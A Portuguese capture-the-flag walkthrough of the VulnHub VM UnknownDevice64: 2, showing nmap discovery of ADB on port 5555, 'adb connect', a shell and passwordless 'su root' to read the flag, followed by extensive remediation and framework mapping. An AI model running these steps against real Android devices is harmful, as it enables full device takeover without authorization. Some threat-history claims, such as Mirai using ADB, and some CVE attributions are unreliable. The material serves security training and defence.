# VulnHub UnknownDevice64: 2 — Invadindo um Android pela Rede, Sem Apertar Botão Nenhum

Em tempos de "Leak" de conversas de ministros, que tal invadir um dispositivo Android? ( ͡° ͜ʖ ͡°)

Mano, essa VM é assustadoramente simples e assustadoramente real ao mesmo tempo. Vamos conectar em um sistema Android rodando na rede, pegar um shell, e escalar para root sem digitar uma única senha. Se isso não te deixar preocupado com os seus próprios dispositivos, não sei o que vai.

Valeu demais ao **Ajay Verma** por montar um desafio que levanta uma pergunta genuinamente relevante: quantos dispositivos Android nas redes corporativas de hoje têm o ADB aberto na porta 5555, acessível por qualquer um da rede? A resposta dói.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Iniciante |
| **VM Alvo** | UnknownDevice64: 2 |
| **VM Atacante** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/unknowndevice64-2,459/ |
| **Técnicas** | Host discovery, enumeração com Nmap, conexão ADB remota, shell Android via ADB, escalação root sem senha |
| **CVEs** | CVE-2019-2205 (ADB arbitrary file write, AOSP), exposição geral de ADB-over-TCP |

---

## Resumo do Ataque

```
[host-discovery: nmap -sn]
    |
    v
[nmap -A -T4 -p-: porta 5555 -> ADB / assinatura Freeciv]
    |
    v
[adb connect IP_ALVO:5555]
    |
    v
[adb shell -> shell Android com usuário limitado]
    |
    v
[su root -> sem senha necessária]
    |
    v
[find / -name *flag*.txt 2>/dev/null]
    |
    v
[cat /data/flag.txt]
```

---

## Metodologia

1. Descoberta de host para identificar o dispositivo Android na rede local
2. Varredura de portas revelando listener ADB na TCP 5555
3. Conexão ADB remota pela rede
4. Shell Android via ADB
5. Escalação root sem senha com `su root`
6. Localização e leitura da flag

---

## Passo 1 — Identificando o Alvo na Rede

Mesmo ponto de partida de sempre: entender a rede antes de qualquer coisa.

```bash
route -n
# Verificar as colunas Iface e Gateway para identificar a sub-rede
```

Varredura de hosts ativos:

```bash
# Opção 1: nmap ping scan
nmap -sn -T5 192.168.10.0/24

# Opção 2: arp-scan (mais rápido em redes locais)
arp-scan --localnet --ignoredups
```

O IP que aparecer além do Kali e do gateway é o dispositivo Android. A partir daqui, chamamos de `IP_ALVO`.

> **MITRE ATT&CK:** T1595.001 Active Scanning: Scanning IP Blocks

---

## Passo 2 — Reconhecimento: Nmap Revela a Porta 5555

Varredura completa. O ADB escuta na TCP 5555 por padrão quando o debug de rede está ativado no Android.

```bash
nmap -A -T4 -p- IP_ALVO
# -A: detecção de OS, versão de serviços, scripts NSE, traceroute
# -T4: timing agressivo (seguro em lab local)
# -p-: todas as 65535 portas TCP
```

Saída esperada:

```
5555/tcp open  freeciv?
```

O Nmap identifica como Freeciv (aquele jogo de estratégia baseado em turnos) porque o protocolo de rede do ADB não tem assinatura oficial no Nmap. Mas tá ligado: Freeciv em um dispositivo Android é basicamente uma confirmação. É o único sistema onde Freeciv e ADB coexistem naturalmente, e a porta 5555 é a porta canônica do ADB-over-TCP. A detecção de OS provavelmente mostra Linux, o que é correto: Android roda sobre kernel Linux.

> **MITRE ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning, T1046 Network Service Discovery

---

## Passo 3 — Conexão via ADB (Android Debug Bridge)

> **O que é ADB?**
> O ADB (Android Debug Bridge) é uma ferramenta de linha de comando versátil que permite comunicação com um dispositivo Android. Ele fornece acesso a shell, transferência de arquivos, instalação de aplicativos e acesso a logs. Normalmente é usado via USB, mas o Android suporta ADB sobre TCP (porta 5555) quando "USB Debugging" e "Network Debugging" estão ativados nas Opções de Desenvolvedor. Quando isso é deixado ativo em um dispositivo conectado à rede, qualquer pessoa na mesma rede pode se conectar sem autenticação.
> Referência: https://developer.android.com/studio/command-line/adb

Instale o ADB se não estiver presente:

```bash
apt install adb -y
```

Conecte ao dispositivo Android:

```bash
adb connect IP_ALVO:5555
```

Saída esperada:

```
connected to IP_ALVO:5555
```

Agora abra o shell:

```bash
adb shell
```

Você verá um prompt como:

```
shell@android:/ $
```

Estamos dentro do dispositivo Android como um usuário shell com privilégios limitados. ( ͡° ͜ʖ ͡°) Já é uma vitória, mas ainda não somos root.

> **Nota mundo real:** Em 2018, pesquisadores encontraram mais de 40 mil dispositivos Android com ADB-over-TCP exposto na internet, muitos deles sendo usados silenciosamente para mineração de criptomoedas após comprometimento via ADB sem autenticação. É o cenário Mirai, mas para Android: o dispositivo vira zumbi em segundos. Referência: https://www.bleepingcomputer.com/news/security/over-40-000-android-devices-hacked-using-exposed-adb-ports/

> **MITRE ATT&CK:** T1133 External Remote Services, T1190 Exploit Public-Facing Application

---

## Passo 4 — Escalação Root Sem Senha

> **Por que dispositivos Android frequentemente permitem root sem senha?**
> O Android herda o modelo de usuários do Linux. Porém, a maioria dos dispositivos Android em modo de desenvolvimento, emuladores, VMs de CTF e dispositivos configurados por desenvolvedores têm o root disponível sem credenciais. Isso é intencional para o caso de uso de debug, mas catastrófico quando esses dispositivos chegam a redes de produção.

Dentro do shell ADB, escale para root:

```bash
su root
```

Mudança de prompt esperada:

```
root@android:/ #
```

Sem senha. Sem prompt adicional. Só root. ಠᴗಠ

Verifique:

```bash
id
# uid=0(root) gid=0(root)
whoami
# root
```

Simples, não acha? ¯\_(ツ)_/¯

> **MITRE ATT&CK:** TA0004 Privilege Escalation, T1078 Valid Accounts (root sem senha)

---

## Passo 5 — Localizando e Lendo a Flag

Busque a flag no sistema:

```bash
find / -name "*flag*" -type f 2>/dev/null
```

A saída mostra o caminho do arquivo, geralmente algo como `/data/flag.txt`. Leia:

```bash
cat /data/flag.txt
```

(⊙_☉) Já acabou?? É isso mesmo. Esta VM é intencionalmente direta para fazer um ponto sobre exposição de dispositivos Android, não para desafiar com camadas de complexidade.

> **MITRE ATT&CK:** T1005 Data from Local System, T1083 File and Directory Discovery

---

## Artefatos Capturados

| Tipo | Valor | Encontrado em | Usado para |
|------|-------|---------------|------------|
| Acesso root ADB | sem senha | TCP 5555, ADB-over-network | su root |
| Flag | ver dispositivo em runtime | `/data/flag.txt` (ou similar) | N/A |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Chave |
|---|--------|--------------------------|-------------|
| 1 | ADB exposto via TCP sem autenticação | Milhares de dispositivos Android em redes corporativas e IoT têm ADB-over-TCP ativado e acessível | Desabilite ADB em todos os dispositivos de produção; bloqueie TCP 5555 com regras de firewall em todas as interfaces não confiáveis |
| 2 | Root sem senha em Android | Builds de debug e desenvolvimento frequentemente têm root sem senha; esses dispositivos às vezes chegam a ambientes de produção | Nunca implante builds Android rooteadas ou de debug em produção; implemente MDM que detecta e alerta sobre dispositivos rooteados |
| 3 | ADB-over-network permite controle total do dispositivo | Um atacante com acesso ADB pode instalar apps, ler todos os dados, exfiltrar contatos e mensagens, e usar o dispositivo como ponto de pivô | Trate ADB-over-network como equivalente a execução remota de código sem autenticação |

**Por que isso importa fora do lab?**

O botnet Mirai (2016) demonstrou em escala como dispositivos com interfaces de gerenciamento abertas e sem credenciais viram infraestrutura de ataque em minutos após a exposição. Dispositivos Android com ADB exposto são um subconjunto específico: em 2018, uma campanha de cryptomining comprometeu mais de 40 mil dispositivos apenas via ADB aberto. Em ambientes corporativos, gateways IoT, painéis de digital signage, sistemas de PDV e quiosques frequentemente rodam Android e raramente são monitorados com o mesmo rigor que estações de trabalho. O celular da diretoria com Opções de Desenvolvedor ativas e conectado ao Wi-Fi corporativo é um vetor de ataque muito real.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Descoberta | TA0007 | Network Service Discovery | T1046 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Acesso Inicial | TA0001 | External Remote Services | T1133 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Escalação de Privilégios | TA0004 | Valid Accounts (root sem senha) | T1078 |
| Coleta | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/
> MITRE D3FEND: https://d3fend.mitre.org/

---

## Contexto de Grupos de Ameaça

**Operadores do botnet Mirai (2016):** Usaram acesso Telnet e ADB sem autenticação para comprometer dispositivos IoT rodando Linux e Android, construindo um botnet usado no ataque DDoS à Dyn em outubro de 2016 que derrubou partes significativas da internet. Referência: MITRE ATT&CK Campaign C0028.

**ADB.Miner (2018):** Um worm que varreu dispositivos Android com ADB-over-TCP exposto na porta 5555 e implantou um payload de mineração de Monero. Os dispositivos infectados foram usados para mineração sem o conhecimento do dono.

**Grupos APT com foco em Android para vigilância:** Múltiplos atores de estado-nação, incluindo grupos alinhados à China e ao Irã, usaram ADB e ferramentas específicas de Android para instalar software de vigilância persistente em dispositivos alvo.

---

## Remediação e Contenção

### Correções Técnicas

1. Desabilite USB Debugging e Network Debugging nas Opções de Desenvolvedor do Android em todos os dispositivos que não são de desenvolvimento ativo
2. Bloqueie a TCP porta 5555 no perímetro de rede e em todos os firewalls e VLANs internos que hospedam dispositivos Android ou IoT
3. Implante um MDM (Mobile Device Management) que aplique uma política proibindo dispositivos rooteados de conectar a recursos corporativos
4. Segmente dispositivos Android e IoT em uma VLAN dedicada sem acesso lateral a sistemas de produção
5. Habilite o Android Enterprise ou modo equivalente de container corporativo para separar dados de trabalho do acesso em nível de dispositivo

### Se Encontrar Algo Semelhante no Seu Ambiente

**Contenção imediata:**
- Isole o dispositivo da rede imediatamente: remova o VLAN membership ou desabilite a porta do switch
- Audite todos os outros dispositivos na mesma VLAN buscando porta 5555 exposta: `nmap -p 5555 --open <sub-rede da VLAN>`
- Revise logs buscando conexões ADB anteriores: verifique leases DHCP, tabelas ARP e logs de switch para o período em que o dispositivo estava ativo
- Assuma que todos os dados no dispositivo estão comprometidos: notifique o responsável pelos dados e inicie o processo de resposta a incidente

**Contramedidas MITRE D3FEND:**
- D3-NTA (Network Traffic Analysis) contra T1133: monitore tráfego do protocolo ADB na porta 5555 em toda a rede corporativa
- D3-MFA (Multi-factor Authentication) contra T1078: exija autenticação para todo acesso remoto a interfaces de gerenciamento de dispositivo, incluindo ADB por chave criptográfica
- D3-NI (Network Isolation) contra T1190: segmente dispositivos Android e IoT em VLANs dedicadas sem roteamento direto para redes de produção
- D3-OPS (OS Process Sandboxing) contra T1548: aplique Android Enterprise Work Profile ou modo de dispositivo dedicado para limitar o raio de explosão em caso de comprometimento

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Inclua todos os dispositivos Android e IoT no inventário de ativos; documente status ADB, status de root e matrícula MDM
- Protect (PR.AC-5): Segmente dispositivos IoT e móveis em zonas de rede dedicadas; aplique menor privilégio para acesso ao dispositivo
- Protect (PR.IP-1): Estabeleça uma baseline de configuração para dispositivos Android; sinalize desvios (rooteado, ADB ativo, sem gerenciamento)
- Detect (DE.CM-1): Monitore tráfego de rede buscando conexões do protocolo ADB na TCP 5555; alerte sobre qualquer conexão de IPs externos ou inesperados
- Respond (RS.MI-1): Contenha dispositivos impactados por isolamento de rede; escale para revogação MDM se for corporativo

**NIST SP 800-53 (Rev. 5):**
- CM-7: Least Functionality: desabilite ADB-over-network em todos os dispositivos não explicitamente autorizados para debug remoto
- SC-7: Boundary Protection: aplique segmentação de rede entre dispositivos móveis e IoT e sistemas de produção
- IA-3: Device Identification and Authentication: exija autenticação ADB por chave criptográfica para quaisquer sessões de debug remoto autorizadas
- SI-2: Flaw Remediation: aplique patches nos dispositivos Android regularmente; CVE-2019-2205 e CVEs relacionados ao ADB requerem atualizações de OS
- AU-12: Audit Record Generation: registre todas as conexões ADB; integre logs de dispositivo em um SIEM centralizado

**CISA Known Exploited Vulnerabilities:**
- CVE-2019-2205: Android ADB arbitrary file write (AOSP): consta no catálogo CISA KEV, aplique atualizações de OS imediatamente
- CVE-2020-0022: Android Bluetooth BlueFrag RCE: frequentemente paired com exposição ADB na mesma classe de dispositivo
- Monitore: https://www.cisa.gov/known-exploited-vulnerabilities-catalog, filtre por "Android"

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: ASSET, Prática: Asset Inventory, MIL-2 alvo: Inventarie todos os ativos móveis e IoT; rastreie versão de OS, status de root e matrícula de gerenciamento
- Domínio: ACCESS, Prática: Access Management, MIL-2 alvo: Exija autenticação para todas as interfaces de gerenciamento remoto de dispositivo, incluindo ADB
- Domínio: TECHNOLOGY, Prática: Configuration Management, MIL-3 alvo: Automatize a detecção de dispositivos desviando da baseline endurecida (ADB ativo, rooteado)

---

## Considerações Finais

Valeu demais, **Ajay Verma**, por montar um desafio que é "simples" na execução mas profundamente relevante no contexto. Pegar um shell em três comandos e root em um quarto é humilhante no bom sentido: é um lembrete de que às vezes a complexidade do ataque é zero, e a vulnerabilidade é puramente organizacional.

A lição real aqui não é "Android é inseguro". Um Android com MDM correto, ADB desativado, Work Profile aplicado e em uma VLAN segmentada adequadamente é um endpoint razoável para empresas. A lição é que configurações padrão de desenvolvedor, combinadas com zero aplicação de segurança de rede, produzem dispositivos que qualquer pessoa com um laptop e `adb connect` pode comprometer totalmente em menos de dois minutos.

Esta VM é uma peça excelente para uma sessão de conscientização de segurança: a demo é curta o suficiente para caber em trinta segundos e chocante o suficiente para que as pessoas se lembrem. Se ela te ajudou a enxergar essa superfície de ataque com mais clareza, missão cumprida.

Compartilha com a galera e continua hackeando!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português pelo André Henrique: https://medium.com/uniaogeek/vulnhub-unknown-device-vm-2

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
